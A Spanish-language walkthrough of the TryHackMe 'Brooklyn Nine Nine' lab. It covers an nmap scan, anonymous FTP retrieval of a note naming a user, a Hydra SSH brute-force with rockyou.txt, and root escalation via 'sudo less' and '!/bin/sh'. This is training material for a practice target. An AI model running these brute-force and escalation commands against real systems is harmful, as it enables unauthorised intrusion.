Maquinas que vamos a utilizar **Kali Linux y Brooklyn Nine Nine** [https://tryhackme.com/room/brooklynninenine](https://tryhackme.com/room/brooklynninenine)

  

```Bash
ping -c 1 10.10.196.44
```

![[Imagenes/image 56.png|image 56.png]]

  

```Bash
nmap -p- -sS -sV -sC --open -min-rate=5000 -n -vvv -Pn 10.10.196.44
```

![[Imagenes/image 1 45.png|image 1 45.png]]

  

- Vamos a ver lo que esta corriendo por el puerto 80 a través del navegador web.
    
    ![[Imagenes/image 2 44.png|image 2 44.png]]
    
    No parece que haya nada interesante aqui.
    
      
    
- Vamos a probar el login FTP como **anonymous.**
    
    ```Bash
    ftp 10.10.196.44
    ```
    
    ![[Imagenes/image 3 43.png|image 3 43.png]]
    
    - Hacemos un listado de archivos
        
        `ls`
        
        ![[Imagenes/image 4 41.png|image 4 41.png]]
        
        Nos encontramos un archivo note_to_jake.txt , que vamos a intentar bajárnoslo a nuestro ordenador utilizando el comando **get**.
        
        `get note_to_jake.txt`
        
        ![[Imagenes/image 5 40.png|image 5 40.png]]
        
        `exit`
        
    
      
    
- Verificamos la descarga del archivo.
    
    ```Bash
    ls
    ```
    
    ![[Imagenes/image 6 38.png|image 6 38.png]]
    

  

- Miramos su contenido
    
    ```Bash
     cat note_to_jake.txt 
    ```
    
    ![[Imagenes/image 7 36.png|image 7 36.png]]
    
    Hemos conseguido el nombre de un usuario.
    
      
    

> [!important] Recapitulemos la maquina victima tiene **abierto** el puerto **21 FTP** y el puerto **22 SSH**. Tenemos un **nombre de usuario Jake** por tanto podemos hacer una **ataque de fuerza bruta con Hydra**.

  

- Atacamos el puerto SSH
    
    ```Bash
    hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.196.44
    ```
    
    ![[Imagenes/image 8 34.png|image 8 34.png]]
    
      
    
- Lo probamos
    
    ```Bash
    ssh jake@10.10.196.44
    ```
    
    ![[Imagenes/image 9 31.png|image 9 31.png]]
    
    Ya estamos dentro.
    
      
    
    ---
    
      
    
- Ahora vamos a intentar escalar privilegios mediante **sudo -l**.
    
    `sudo -l`
    
    ![[Imagenes/image 10 27.png|image 10 27.png]]
    
    Vemos que **podemos ejecutar** el binario **less** con sudo.
    
      
    
- Nos vamos a la web [https://gtfobins.github.io/](https://gtfobins.github.io/). Y **buscamos** el binario **less con sudo.**
    
    ![[Imagenes/image 11 21.png|image 11 21.png]]
    
    ![[Imagenes/image 12 21.png|image 12 21.png]]
    

  

- Ejecutamos los comandos. NOTA: no olvidar poner la ruta absoluta para evitar errores.
    
    `sudo less /etc/profile`  
      
    
    ![[Imagenes/image 13 20.png|image 13 20.png]]
    
    ![[Imagenes/image 14 18.png|image 14 18.png]]
    

`!/bin/sh` y pulsamos la tecla Enter

![[Imagenes/image 15 15.png|image 15 15.png]]

`whoami`

![[Imagenes/image 16 12.png|image 16 12.png]]